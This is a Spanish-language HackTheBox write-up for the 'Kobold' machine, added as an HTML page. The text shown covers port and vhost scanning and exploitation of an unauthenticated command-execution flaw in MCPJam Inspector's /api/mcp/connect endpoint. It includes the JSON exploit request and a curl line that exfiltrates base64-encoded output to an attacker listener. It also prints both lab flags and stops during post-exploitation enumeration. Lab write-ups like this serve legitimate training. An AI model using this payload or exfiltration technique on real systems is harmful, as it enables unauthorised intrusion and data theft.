@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kobold — HTB Machine Writeup | Yoandy Ramirez Delgado</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --ink:#0b1a10;--forest:#0f2318;--pine:#163020;--moss:#1e4030;--sage:#2a6048;
+  --green:#00e87a;--green2:rgba(0,232,122,.15);--green3:rgba(0,232,122,.06);
+  --cream:#f2ede4;--cream2:#faf7f1;
+  --text:#c8f0dc;--text2:rgba(200,240,220,.65);--text3:rgba(200,240,220,.35);
+  --card:#0d2215;--card2:#112b1c;--border:rgba(0,232,122,.1);
+  --red:#f87171;--yellow:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;--orange:#fb923c;--cyan:#22d3ee;
+  --bb:'Bebas Neue',sans-serif;--dm:'DM Sans',sans-serif;--mo:'JetBrains Mono',monospace;
+  --accent:#00e87a;--bg:#0b1a10;--bg2:#0f2318;--bg3:#163020;
+  --text-muted:rgba(200,240,220,.35);--text-dim:rgba(200,240,220,.65);
+  --green4:#4ade80;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--ink);color:var(--text);font-family:var(--dm);line-height:1.7;font-size:15px;}
+a{color:var(--green);text-decoration:none;}
+code{background:var(--card2);padding:.15rem .4rem;border-radius:3px;font-family:var(--mo);font-size:.88em;color:var(--green);}
+pre{margin:0;white-space:pre-wrap;word-break:break-all;font-family:var(--mo);}
+ul{padding-left:1.5rem;}li{margin:.35rem 0;}
+h2{font-family:var(--bb);font-size:1.6rem;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1.25rem;letter-spacing:.04em;}
+h3{font-size:1.05rem;color:var(--text);margin-bottom:.75rem;font-weight:600;}
+
+/* ─── HERO ─── */
+.hero {
+  background: linear-gradient(135deg, var(--forest) 0%, var(--ink) 50%, #091a10 100%);
+  border-bottom: 1px solid var(--border);
+  padding: 60px 40px 50px;
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: 0;
+  background-image: linear-gradient(rgba(0,232,122,0.03) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(0,232,122,0.03) 1px, transparent 1px);
+  background-size: 56px 56px;
+  pointer-events: none;
+}
+.hero-layout {
+  max-width: 1200px; margin: 0 auto;
+  display: grid; grid-template-columns: 1fr 280px; gap: 48px; align-items: center;
+}
+@media(max-width: 900px) {
+  .hero-layout { grid-template-columns: 1fr; }
+  .hero-orb { order: -1; justify-self: center; }
+  .hero-meta { justify-content: center; }
+  .hero-sub { margin-left: auto; margin-right: auto; }
+  .hero-stats { justify-content: center; }
+}
+.hero-left { position: relative; z-index: 2; }
+.hero-brand {
+  font-family: var(--mo); font-size: 0.65rem;
+  color: rgba(0,232,122,0.45); letter-spacing: 0.2em; margin-bottom: 16px;
+  display: flex; align-items: center; gap: 8px;
+}
+.hero-brand-dot {
+  width: 6px; height: 6px; border-radius: 50%; background: var(--green);
+  box-shadow: 0 0 10px var(--green); animation: hpd 1.2s infinite alternate;
+}
+@keyframes hpd { to { opacity: 0.2; transform: scale(0.5); } }
+.hero h1 {
+  font-family: var(--bb); font-size: clamp(2.4rem, 4vw, 3.5rem);
+  font-weight: 400; letter-spacing: 0.04em; margin-bottom: 14px; line-height: 1;
+  color: var(--text);
+}
+.hero h1 span { color: var(--green); }
+.hero-sub {
+  color: var(--text2); font-size: 0.95rem; max-width: 600px;
+  margin-bottom: 24px; line-height: 1.7; font-weight: 300;
+}
+.hero-meta {
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 18px;
+}
+.tag {
+  display: inline-flex; align-items: center; gap: 5px;
+  padding: 4px 12px; border-radius: 4px;
+  font-family: var(--mo);
+  font-size: 10px; font-weight: 500; letter-spacing: 0.8px; text-transform: uppercase;
+}
+.tag-platform { background: rgba(0,232,122,0.1); color: var(--green); border: 1px solid rgba(0,232,122,0.25); }
+.tag-category { background: rgba(56,217,245,0.08); color: var(--cyan); border: 1px solid rgba(56,217,245,0.2); }
+.tag-diff { background: rgba(0,232,122,0.08); color: var(--green); border: 1px solid rgba(0,232,122,0.2); }
+.tag-diff-medium { background: rgba(245,166,35,0.08); color: #f5a623; border: 1px solid rgba(245,166,35,0.2); }
+.tag-diff-hard { background: rgba(248,113,113,0.08); color: var(--red); border: 1px solid rgba(248,113,113,0.2); }
+.tag-os { background: rgba(167,139,250,0.08); color: var(--purple); border: 1px solid rgba(167,139,250,0.2); }
+.tag-staff { background: rgba(245,166,35,0.08); color: #f5a623; border: 1px solid rgba(245,166,35,0.2); }
+.hero-stats {
+  display: flex; gap: 28px; flex-wrap: wrap;
+}
+.stat { display: flex; flex-direction: column; gap: 2px; }
+.stat-label {
+  font-family: var(--mo);
+  font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text3);
+}
+.stat-value { font-size: 1rem; font-weight: 700; color: var(--text); }
+.stat-value.green { color: var(--green); }
+
+/* Orb */
+.hero-orb { display: flex; align-items: center; justify-content: center; position: relative; }
+.orb-w { position: relative; width: 260px; height: 260px; }
+.orb-w .orb-el { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; }
+.orb-ring { position: absolute; border-radius: 50%; border: 1px solid; animation: ors linear infinite; }
+.orb-r1 { width: 260px; height: 260px; border-color: rgba(0,232,122,0.08); animation-duration: 30s; }
+.orb-r2 { width: 214px; height: 214px; border-color: rgba(0,232,122,0.12); animation-duration: 20s; animation-direction: reverse; border-style: dashed; }
+.orb-r3 { width: 172px; height: 172px; border-color: rgba(0,232,122,0.15); animation-duration: 15s; }
+@keyframes ors { to { transform: rotate(360deg); } }
+.orb-aura {
+  position: absolute; width: 200px; height: 200px; border-radius: 50%;
+  background: radial-gradient(circle, rgba(0,232,122,0.18) 0%, rgba(0,232,122,0.08) 35%, transparent 70%);
+  animation: oap 4s ease-in-out infinite;
+}
+@keyframes oap { 0%,100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
+.orb-core {
+  width: 130px; height: 130px; border-radius: 50%;
+  background: radial-gradient(circle at 38% 35%, rgba(0,232,122,0.35) 0%, rgba(15,48,32,0.8) 50%, rgba(11,26,16,0.95) 100%);
+  border: 1px solid rgba(0,232,122,0.3);
+  box-shadow: 0 0 60px rgba(0,232,122,0.2), 0 0 120px rgba(0,232,122,0.08), inset 0 0 40px rgba(0,232,122,0.1);
+  position: relative; z-index: 3; display: flex; align-items: center; justify-content: center; overflow: hidden;
+}
+.orb-core::before {
+  content: ''; position: absolute; top: 10%; left: 15%; width: 40%; height: 30%;
+  border-radius: 50%; background: rgba(255,255,255,0.12); filter: blur(8px);
+}
+.orb-rune {
+  font-family: var(--bb); font-size: 2.2rem; color: rgba(0,232,122,0.7);
+  text-shadow: 0 0 30px var(--green); position: relative; z-index: 2;
+  animation: org 3s ease-in-out infinite;
+}
+@keyframes org { 0%,100% { text-shadow: 0 0 20px var(--green), 0 0 40px rgba(0,232,122,0.4); } 50% { text-shadow: 0 0 40px var(--green), 0 0 80px rgba(0,232,122,0.6); } }
+.orb-scan {
+  position: absolute; left: 0; right: 0; height: 1.5px;
+  background: linear-gradient(90deg, transparent, rgba(0,232,122,0.5), transparent);
+  animation: osc 3s linear infinite; z-index: 4; pointer-events: none;
+}
+@keyframes osc { 0% { top: 5%; opacity: 0; } 10% { opacity: 0.8; } 90% { opacity: 0.5; } 100% { top: 95%; opacity: 0; } }
+.particle{position:absolute;width:3px;height:3px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pf linear infinite}
+.p1{top:15%;left:25%;animation-duration:6s}.p2{top:25%;right:18%;animation-duration:8s;animation-delay:-2s;width:4px;height:4px}.p3{bottom:20%;left:30%;animation-duration:7s;animation-delay:-4s}.p4{bottom:30%;right:25%;animation-duration:9s;animation-delay:-1s;opacity:.6}
+@keyframes pf{0%{transform:translateY(0) scale(1);opacity:1}33%{transform:translateY(-12px) translateX(8px) scale(1.3);opacity:.7}66%{transform:translateY(-6px) translateX(-10px) scale(.8);opacity:.9}100%{transform:translateY(0) scale(1);opacity:1}}
+
+/* ─── LAYOUT ─── */
+.container{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:900px){.container{grid-template-columns:1fr;}.code-compare,.lessons-grid{grid-template-columns:1fr;}}
+
+/* ─── SECTIONS ─── */
+.section{margin:2.5rem 0;}
+.step-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.step-number{font-size:.7rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:.4rem;font-family:var(--mo);}
+.why-box{background:rgba(0,232,122,.05);border-left:3px solid rgba(0,232,122,.4);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.why-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.why-box p{font-size:.9rem;color:var(--text2);}
+.cmd-annotated{background:rgba(5,14,8,.9);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);margin:1rem 0;border:1px solid var(--border);}
+.cmd-line{font-size:1rem;line-height:2;}
+.cmd{color:var(--green);font-weight:700;}.flag-opt{color:var(--yellow);}.ip{color:var(--orange);}.param{color:var(--cyan);}
+.user-c{color:var(--purple);}.str-c{color:var(--green);}.comment-c{color:var(--text3);}
+.cmd-notes{margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:.3rem;}
+.cmd-note{font-size:.8rem;color:var(--text2);padding:.3rem .75rem;border-left:2px solid var(--border);}
+.output-box{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);font-size:.82rem;color:var(--text2);margin:1rem 0;overflow-x:auto;line-height:1.6;}
+.output-label{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.interpret-box{background:rgba(0,232,122,.05);border-left:3px solid var(--green);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.interpret-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.interpret-box p,.interpret-box li{font-size:.88rem;color:var(--text2);}
+.decision-box{background:rgba(251,146,60,.05);border-left:3px solid var(--orange);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.decision-box strong{color:var(--orange);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.decision-box p{font-size:.88rem;color:var(--text2);}
+.info-box{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1.25rem 0;}
+.info-box p{font-size:.9rem;color:var(--text2);}
+.vuln-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.vuln-card h3{color:var(--red);margin-bottom:.75rem;}
+.danger-box{background:rgba(248,113,113,.05);border-left:3px solid var(--red);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.danger-box strong{color:var(--red);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.danger-box p{font-size:.88rem;color:var(--text2);}
+.agent-panel{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem;margin:1.5rem 0;}
+@media(max-width:700px){.agent-panel{grid-template-columns:1fr;}}
+.agent-card{background:var(--card2);border-radius:10px;padding:1rem;border:1px solid var(--border);}
+.agent-card.rto{border-top:3px solid var(--orange);}
+.agent-card.bta{border-top:3px solid var(--cyan);}
+.agent-card.bhm{border-top:3px solid var(--purple);}
+.agent-label{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.agent-card.rto .agent-label{color:var(--orange);}
+.agent-card.bta .agent-label{color:var(--cyan);}
+.agent-card.bhm .agent-label{color:var(--purple);}
+.agent-card p{font-size:.82rem;color:var(--text2);}
+.warning-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:8px;padding:1rem;display:flex;gap:1rem;align-items:flex-start;margin:1rem 0;}
+.warning-icon{font-size:1.5rem;flex-shrink:0;}
+.warning-card strong{color:var(--red);display:block;margin-bottom:.25rem;}
+.warning-card p{font-size:.85rem;color:var(--text2);}
+.data-table{width:100%;border-collapse:collapse;font-size:.85rem;margin:1rem 0;}
+.data-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.75rem;text-transform:uppercase;}
+.data-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.data-table tr:last-child td{border-bottom:none;}
+.data-table .highlight{color:var(--green);font-weight:600;}
+.lessons-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+@media(max-width:700px){.lessons-grid{grid-template-columns:1fr;}}
+.lesson-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
+.lesson-card h4{font-size:.85rem;margin-bottom:.75rem;}
+.lesson-card.attacker h4{color:var(--orange);}
+.lesson-card.defender h4{color:var(--cyan);}
+.lesson-card li{font-size:.83rem;color:var(--text2);}
+.flag-box{background:linear-gradient(135deg,rgba(0,232,122,.06),rgba(0,232,122,.02));border:1px solid rgba(0,232,122,.25);border-radius:14px;padding:2rem;text-align:center;margin:2.5rem 0;}
+.flag-label{font-size:.75rem;color:var(--text3);text-transform:uppercase;letter-spacing:3px;margin-bottom:.75rem;font-family:var(--mo);}
+.flag-value{font-family:var(--mo);font-size:1.1rem;color:var(--green);background:rgba(0,232,122,.08);padding:.6rem 1.5rem;border-radius:8px;display:inline-block;border:1px solid rgba(0,232,122,.2);}
+
+/* Attack flow */
+.attack-flow{display:flex;align-items:center;gap:0;margin:1.5rem 0;flex-wrap:wrap;justify-content:center;}
+.flow-box{background:var(--card2);border:1px solid var(--border);border-radius:8px;padding:12px 16px;font-size:.85em;text-align:center;min-width:140px;}
+.flow-box strong{display:block;font-size:.72rem;text-transform:uppercase;letter-spacing:.5px;color:var(--text3);margin-bottom:4px;font-family:var(--mo);}
+.flow-box span{color:var(--text);font-weight:600;font-size:.88rem;}
+.flow-arrow{color:var(--green);font-size:1.4em;padding:0 8px;font-weight:700;}
+
+/* Rabbit holes */
+.rabbit-hole{background:rgba(248,113,113,.04);border:1px solid rgba(248,113,113,.15);border-radius:10px;padding:1.25rem;margin:1rem 0;}
+.rabbit-hole h4{color:var(--red);font-size:.9rem;margin-bottom:.5rem;}
+.rabbit-hole p{color:var(--text2);font-size:.85rem;}
+
+/* Glosario */
+.glos-item{display:grid;grid-template-columns:200px 1fr;gap:12px;padding:.6rem 0;border-bottom:1px solid var(--border);font-size:.85rem;}
+.glos-item:last-child{border-bottom:none;}
+.glos-term{color:var(--orange);font-weight:600;font-family:var(--mo);}
+.glos-def{color:var(--text2);}
+@media(max-width:700px){.glos-item{grid-template-columns:1fr;}}
+
+/* ─── SIDEBAR ─── */
+.sidebar{position:sticky;top:2rem;height:fit-content;}
+.sidebar-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.sidebar-card h4{margin:0 0 .9rem;font-size:.72rem;text-transform:uppercase;letter-spacing:2px;color:var(--text3);font-family:var(--mo);}
+.meta-row{display:flex;justify-content:space-between;align-items:center;font-size:.83rem;padding:.45rem 0;border-bottom:1px solid var(--border);}
+.meta-row:last-child{border-bottom:none;}
+.meta-label{color:var(--text3);}.meta-value{color:var(--text);font-weight:600;font-family:var(--mo);font-size:.8rem;}
+.mitre-tag{display:inline-block;background:rgba(167,139,250,.08);color:var(--purple);border:1px solid rgba(167,139,250,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.score-num{font-size:2.8rem;font-weight:900;color:var(--green);text-align:center;line-height:1;margin:.5rem 0;font-family:var(--bb);}
+.score-label{text-align:center;font-size:.75rem;color:var(--text3);}
+.glosario-item{padding:.5rem 0;border-bottom:1px solid var(--border);font-size:.8rem;}
+.glosario-item:last-child{border-bottom:none;}
+.glosario-term{color:var(--cyan);font-weight:600;font-family:var(--mo);display:block;margin-bottom:.15rem;}
+.glosario-def{color:var(--text3);line-height:1.4;}
+.toc-link{display:block;padding:.3rem 0;font-size:.8rem;color:var(--text2);border-bottom:1px solid var(--border);transition:color .2s;}
+.toc-link:last-child{border-bottom:none;}
+.toc-link:hover{color:var(--green);}
+
+/* CVSS badge */
+.cvss{display:inline-block;background:rgba(248,113,113,.2);color:var(--red);padding:2px 10px;border-radius:4px;font-size:.82rem;font-weight:700;margin-left:8px;font-family:var(--mo);}
+
+</style>
+</head>
+<body>
+
+<!-- ═══ HERO ═══ -->
+<div class="hero">
+  <div class="hero-layout">
+    <div class="hero-left">
+      <div class="hero-brand"><span class="hero-brand-dot"></span>HEINDALL // WRITEUP</div>
+      <div class="hero-meta">
+        <span class="tag tag-platform">HackTheBox</span>
+        <span class="tag tag-category">Season Machine</span>
+        <span class="tag tag-diff">Easy</span>
+        <span class="tag tag-os">Linux</span>
+      </div>
+      <h1><span>Kobold</span> — MCP Inspector RCE + Docker Escape</h1>
+      <p class="hero-sub">Explotación de CVE-2026-23744 en MCPJam Inspector expuesto en 0.0.0.0, permitiendo RCE no autenticado vía el endpoint /api/mcp/connect. Escalada de privilegios mediante sg docker aprovechando una contraseña vacía en /etc/gshadow, seguida de Docker escape con montaje del filesystem del host para leer la root flag.</p>
+      <div class="hero-stats">
+        <div class="stat"><span class="stat-label">Target</span><span class="stat-value green">10.129.15.44</span></div>
+        <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Linux</span></div>
+        <div class="stat"><span class="stat-label">Puertos</span><span class="stat-value">22 · 80 · 443 · 3552</span></div>
+        <div class="stat"><span class="stat-label">CVE</span><span class="stat-value" style="color:var(--red);">CVE-2026-23744</span></div>
+        <div class="stat"><span class="stat-label">Fecha</span><span class="stat-value">2026-03-22</span></div>
+      </div>
+    </div>
+    <!-- Orb — Right -->
+    <div class="hero-orb">
+      <div class="orb-w">
+        <div class="orb-el">
+          <div class="orb-ring orb-r1"></div>
+          <div class="orb-ring orb-r2"></div>
+          <div class="orb-ring orb-r3"></div>
+          <div class="orb-aura"></div>
+          <div class="orb-core"><span class="orb-rune">ᚺ</span></div>
+          <div class="orb-scan"></div>
+          <div class="particle p1"></div>
+          <div class="particle p2"></div>
+          <div class="particle p3"></div>
+          <div class="particle p4"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+<main>
+
+<!-- CADENA DE ATAQUE -->
+<div class="section">
+  <h2>Cadena de Ataque</h2>
+  <div class="attack-flow">
+    <div class="flow-box"><strong>Reconocimiento</strong><span>nmap + vhosts</span></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box" style="border-color: var(--orange);"><strong>Foothold</strong><span>CVE-2026-23744<br>MCP Inspector RCE</span></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box"><strong>User Flag</strong><span>ben@kobold</span></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box" style="border-color: var(--red);"><strong>PrivEsc</strong><span>sg docker<br>Docker Escape</span></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box" style="border-color: var(--green);"><strong>Root Flag</strong><span>root@kobold</span></div>
+  </div>
+</div>
+
+<!-- FLAGS -->
+<div class="section">
+  <h2>Flags</h2>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;">
+    <div class="flag-box" style="border-left:3px solid var(--blue);">
+      <div class="flag-label">🏳 User Flag</div>
+      <div class="flag-value">6f963e43d9e10926cb8a81665bada13d</div>
+    </div>
+    <div class="flag-box" style="border-left:3px solid var(--green);">
+      <div class="flag-label">🚩 Root Flag</div>
+      <div class="flag-value">846c2c10c0cb72b6d2b4b9dc7254641f</div>
+    </div>
+  </div>
+</div>
+
+<!-- FASE 1: RECONOCIMIENTO -->
+<div class="section" id="recon">
+  <h2>1 — Reconocimiento</h2>
+
+  <div class="step-box">
+    <div class="step-number">Paso 1 — Reconocimiento</div>
+    <h3>Escaneo de puertos con nmap</h3>
+    <div class="why-box">
+      <strong>¿Qué es nmap?</strong>
+      <p>Network Mapper — herramienta de escaneo de redes que detecta puertos abiertos, servicios y versiones. Es el primer paso en cualquier pentest para conocer la superficie de ataque.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">nmap</span> <span class="flag-opt">-p-</span> <span class="flag-opt">--open</span> <span class="flag-opt">-n</span> <span class="flag-opt">-T4</span> <span class="flag-opt">-sS</span> <span class="ip">10.129.15.44</span></div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-p-</code> → todos los 65535 puertos TCP</div>
+        <div class="cmd-note"><code>--open</code> → solo puertos abiertos</div>
+        <div class="cmd-note"><code>-T4</code> → velocidad agresiva</div>
+        <div class="cmd-note"><code>-sS</code> → SYN scan (más sigiloso)</div>
+      </div>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">nmap</span> <span class="flag-opt">-p</span> <span class="param">22,80,443,3552</span> <span class="flag-opt">-sC</span> <span class="flag-opt">-sV</span> <span class="ip">10.129.15.44</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 9.2p1
+80/tcp   open  http     nginx
+443/tcp  open  https    nginx
+3552/tcp open  http     arcane deployment platform v1.13.0</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Interpretación</strong>
+      <p>Puerto 443 → TLS con vhosts. Puerto 3552 → arcane (deployment platform). La presencia de nginx con SSL sugiere múltiples virtual hosts que debemos enumerar.</p>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Enumerar vhosts con gobuster/ffuf para descubrir subdominios en kobold.htb.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 2 — Reconocimiento</div>
+    <h3>Descubrimiento de Virtual Hosts</h3>
+    <div class="why-box">
+      <strong>¿Por qué buscar vhosts?</strong>
+      <p>Un servidor nginx puede servir múltiples aplicaciones en la misma IP, diferenciándolas por el header <code>Host</code>. Aplicaciones de administración suelen estar en subdominios separados.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">gobuster</span> <span class="flag-opt">vhost</span> <span class="flag-opt">-u</span> <span class="ip">https://10.129.15.44</span> <span class="flag-opt">-w</span> <span class="param">/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span> <span class="flag-opt">--append-domain</span> <span class="flag-opt">-k</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>Found: <span style="color:var(--yellow);font-weight:700;">mcp.kobold.htb</span>   → MCP Inspector (puerto 443)
+Found: <span style="color:var(--yellow);font-weight:700;">bin.kobold.htb</span>   → PrivateBin (pastebin privado)</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Interpretación</strong>
+      <p>Dos vhosts:</p>
+      <ul>
+        <li><code>mcp.kobold.htb</code> → MCPJam Inspector, herramienta de desarrollo para servidores MCP</li>
+        <li><code>bin.kobold.htb</code> → PrivateBin, servicio de pastebin cifrado (en contenedor Docker)</li>
+      </ul>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Investigar MCP Inspector — es un servicio menos conocido con potencial de CVEs recientes.</p>
+    </div>
+  </div>
+</div>
+
+<!-- FASE 2: FOOTHOLD -->
+<div class="section" id="foothold">
+  <h2>2 — Foothold: CVE-2026-23744 (MCP Inspector RCE)</h2>
+
+  <div class="vuln-card">
+    <h3>⚠ CVE-2026-23744 <span class="cvss">CVSS 9.8 CRÍTICA</span></h3>
+    <p style="color:var(--text2);font-size:.9rem;margin-top:.5rem;">MCPJam Inspector ≤ v1.4.2 permite RCE no autenticado. El inspector escucha en <code>0.0.0.0</code> (todas las interfaces) en lugar de <code>127.0.0.1</code>, permitiendo que un atacante remoto envíe una petición HTTP que desencadena la ejecución de un servidor MCP arbitrario.</p>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 1 — Análisis de la vulnerabilidad</div>
+    <h3>¿Cómo funciona la vulnerabilidad?</h3>
+    <div class="why-box">
+      <strong>¿Qué es MCP Inspector?</strong>
+      <p>Model Context Protocol Inspector es una herramienta de desarrollo que permite a los desarrolladores conectarse y probar servidores MCP. Expone una API REST para conectar servidores MCP especificando el comando a ejecutar.</p>
+    </div>
+    <p style="color:var(--text2);font-size:.9rem;margin:.75rem 0;">El endpoint <code>POST /api/mcp/connect</code> acepta un <code>serverConfig</code> con el campo <code>command</code> y <code>args</code> — indica al inspector qué binario ejecutar para iniciar el servidor MCP. Al no validar ni restringir qué comandos se pueden ejecutar, cualquier petición puede lanzar comandos arbitrarios en el servidor.</p>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c">// Estructura del payload vulnerable</span></div>
+      <div class="cmd-line">{</div>
+      <div class="cmd-line">&nbsp;&nbsp;<span class="flag-opt">"serverId"</span>: <span class="str-c">"atacante"</span>,</div>
+      <div class="cmd-line">&nbsp;&nbsp;<span class="flag-opt">"serverConfig"</span>: {</div>
+      <div class="cmd-line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="flag-opt">"command"</span>: <span class="str-c">"bash"</span>, <span class="comment-c">← comando a ejecutar</span></div>
+      <div class="cmd-line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="flag-opt">"args"</span>: [<span class="str-c">"-c"</span>, <span class="str-c">"PAYLOAD"</span>] <span class="comment-c">← reverse shell</span></div>
+      <div class="cmd-line">&nbsp;&nbsp;}</div>
+      <div class="cmd-line">}</div>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 2 — Explotación</div>
+    <h3>Exfiltración de datos via HTTP (base64 + curl)</h3>
+    <div class="why-box">
+      <strong>¿Por qué base64+curl en lugar de reverse shell directa?</strong>
+      <p>El servidor puede tener restricciones de firewall outbound. Esta técnica funciona aunque solo esté habilitado el tráfico HTTP saliente. Ejecutamos el comando, codificamos el output en base64 y lo enviamos a nuestro servidor como parámetro GET.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Técnica de exfiltración: cmd → base64 → curl GET</span></div>
+      <div class="cmd-line"><span class="flag-opt">EXFIL_CMD</span>=<span class="str-c">"(whoami) 2>&1 | base64 -w0 | xargs -I{} curl -s 'http://10.10.15.131:9000/?d={}'"</span></div>
+      <div class="cmd-line"></div>
+      <div class="cmd-line"><span class="comment-c"># Enviamos el payload al MCP Inspector</span></div>
+      <div class="cmd-line"><span class="cmd">curl</span> <span class="flag-opt">-k</span> <span class="flag-opt">-X POST</span> <span class="ip">https://mcp.kobold.htb/api/mcp/connect</span> \</div>
+      <div class="cmd-line">&nbsp;&nbsp;<span class="flag-opt">-H</span> <span class="str-c">"Content-Type: application/json"</span> \</div>
+      <div class="cmd-line">&nbsp;&nbsp;<span class="flag-opt">-d</span> <span class="str-c">'{"serverId":"x","serverConfig":{"command":"bash","args":["-c","EXFIL_CMD"]}}'</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Listener HTTP</div>
+      <pre><span class="comment-c"># En nuestro listener HTTP recibimos:</span>
+GET /?d=<span style="color:var(--yellow);font-weight:700;">YmVuCg==</span>
+<span class="comment-c"># Decodificamos: echo "YmVuCg==" | base64 -d</span>
+<span style="color:var(--green);font-weight:700;">ben</span></pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Resultado</strong>
+      <p>Tenemos RCE como usuario <code>ben</code> (uid=1001). Podemos ejecutar cualquier comando en el servidor objetivo.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 3 — User Flag</div>
+    <h3>Captura de la User Flag</h3>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">cat</span> <span class="param">/home/ben/user.txt</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre><span style="color:var(--green);font-weight:700;">6f963e43d9e10926cb8a81665bada13d</span></pre>
+    </div>
+  </div>
+</div>
+
+<!-- FASE 3: POST-EXPLOTACIÓN -->
+<div class="section" id="postenum">
+  <h2>3 — Enumeración Post-Explotación</h2>
+
+  <div class="step-box">
+    <div class="step-number">Paso 1 — Enumeración</div>
+    <h3>Enumeración del usuario ben</h3>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">id</span> && <span class="cmd">cat</span> /etc/passwd | grep -E 'ben|alice'</div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>uid=1001(ben) gid=1001(ben) <span style="color:var(--yellow);font-weight:700;">groups=1001(ben),37(operator)</span>
+
+ben:x:1001:1001::/home/ben:/bin/bash
+alice:x:1000:1000::/home/alice:/bin/bash</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Hallazgo clave</strong>
+      <p>Ben pertenece al grupo <code>operator</code> (gid=37) además de su grupo primario. Los grupos no estándar son siempre candidatos a ser vectores de privesc.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 2 — Enumeración</div>
+    <h3>Análisis de membresías de grupo</h3>
